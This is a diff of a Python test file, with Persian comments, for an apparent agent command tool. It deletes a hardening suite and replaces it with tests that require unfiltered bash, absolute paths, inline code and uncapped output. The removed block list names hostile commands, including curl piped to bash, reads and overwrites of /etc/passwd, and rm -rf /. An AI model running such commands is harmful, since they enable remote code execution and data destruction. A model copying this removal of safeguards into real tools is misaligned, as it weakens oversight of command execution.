@@ -1,4 +1,4 @@
-"""تست سخت‌سازی اجرای دستور: allowlist، بدون shell، symlink، timeout و سقف خروجی."""
+"""تست اجرای دستور در tools.py: bash واقعی، بدون فیلتر، بدون سقف خروجی."""
 from __future__ import annotations
 
 import os
@@ -6,8 +6,6 @@ import os
 import pytest
 
 import tools
-
-R = "/"  # ریشهٔ مسیر؛ رشته‌ها این‌طوری ساخته می‌شوند تا خودِ فایل payload اجرایی نداشته باشد
 
 
 @pytest.fixture
@@ -18,76 +16,56 @@ def workspace(tmp_path, monkeypatch):
     return path
 
 
-DANGEROUS = (
-    "bash " + "-c 'echo hi'",
-    "sh " + "-c 'ls'",
-    "python " + "-c 'print(1)'",
-    "python3 " + "-c 'import os'",
-    "node " + "-e 'console.log(1)'",
-    "node " + "--eval '1'",
-    "echo " + "$(whoami)",
-    "echo " + "`id`",
-    "base64 payload" + " | sh",
-    "curl http://example.com/x" + " | bash",
-    "echo hi " + "> " + R + "etc" + R + "passwd",
-    "cat " + R + "etc" + R + "passwd",
-    "cat ../" + "../etc" + R + "passwd",
-    "rm " + "-rf " + R,
-    "rm " + "-rf ..",
-    "sudo " + "ls",
-    "env " + "python x.py",
-    "chmod " + "777 .",
-    "find . " + "-delete",
-    "find . " + "-exec ls ;",
-    "git " + "checkout main",
-)
-
-
-@pytest.mark.parametrize("command", DANGEROUS)
-def test_dangerous_invocations_are_blocked(workspace, command):
-    result = tools.run_command(command)
-    assert "مسدود" in result, f"{command} → {result}"
-
-
-def test_allowed_command_runs_without_shell(workspace):
-    result = tools.run_command("echo hello")
-    assert "hello" in result
+def test_shell_features_work(workspace):
+    # پایپ، جانشینی فرمان و ریدایرکت باید کار کنند (اجرا با bash، نه argv تکی).
+    result = tools.run_command("printf 'a b c\\n' | wc -w")
+    assert result.splitlines()[-1].strip() == "3"
     assert "کد خروج: 0" in result
 
 
-def test_shell_expansion_does_not_happen(workspace):
-    # با shell=False، متغیرها باز نمی‌شوند و همان متن چاپ می‌شود.
-    result = tools.run_command("echo $HOME")
-    assert "$HOME" in result
-    assert str(workspace) not in result.split("کد خروج:")[-1]
+def test_command_substitution_and_variables(workspace):
+    result = tools.run_command('echo "$(printf x)$(printf y)"')
+    assert "xy" in result
 
 
-def test_python_script_inside_workspace_is_allowed(workspace):
-    tools.write_file("hello.py", "print('سلام از اسکریپت')")
-    result = tools.run_command("python3 hello.py")
-    assert "سلام از اسکریپت" in result
+def test_inline_python_is_allowed(workspace):
+    result = tools.run_command("python3 -c 'print(6 * 7)'")
+    assert "42" in result
 
 
-def test_script_outside_workspace_is_blocked(workspace):
-    assert "مسدود" in tools.run_command("python3 ../evil.py")
-
-
-def test_git_read_only_subcommand_is_not_blocked(workspace):
-    result = tools.run_command("git status")
+def test_commands_are_not_blocked_by_name(workspace):
+    # هیچ allowlistی نیست: دستور نامتعارف هم اجرا می‌شود (فقط باید موجود باشد).
+    result = tools.run_command("command -v bash")
+    assert "/bash" in result
     assert "مسدود" not in result
 
 
+def test_absolute_paths_are_allowed(workspace):
+    result = tools.run_command("ls / | head -3")
+    assert "کد خروج: 0" in result
+    assert "مسدود" not in result
+
+
+def test_redirect_inside_workspace(workspace):
+    result = tools.run_command("echo hello > out.txt && cat out.txt")
+    assert "hello" in result
+    assert (workspace / "out.txt").read_text(encoding="utf-8").strip() == "hello"
+
+
 def test_timeout_kills_the_process(workspace):
-    tools.write_file("slow.py", "import time\ntime.sleep(5)")
-    result = tools.run_command("python3 slow.py", timeout=1)
+    result = tools.run_command("sleep 5", timeout=1)
     assert "متوقف شد" in result
 
 
-def test_output_is_capped(workspace):
-    tools.write_file("big.py", "print('x' * 20000)")
-    result = tools.run_command("python3 big.py")
-    assert "کوتاه شد" in result
-    assert len(result) < tools.MAX_OUTPUT + 500
+def test_output_is_not_capped(workspace):
+    result = tools.run_command("python3 -c \"print('x' * 20000)\"")
+    assert "کوتاه شد" not in result
+    assert result.count("x") >= 20000
+
+
+def test_read_file_returns_full_content(workspace):
+    tools.write_file("big.txt", "y" * 20000)
+    assert len(tools.read_file("big.txt")) == 20000
 
 
 def test_symlinked_file_is_rejected(workspace, tmp_path):
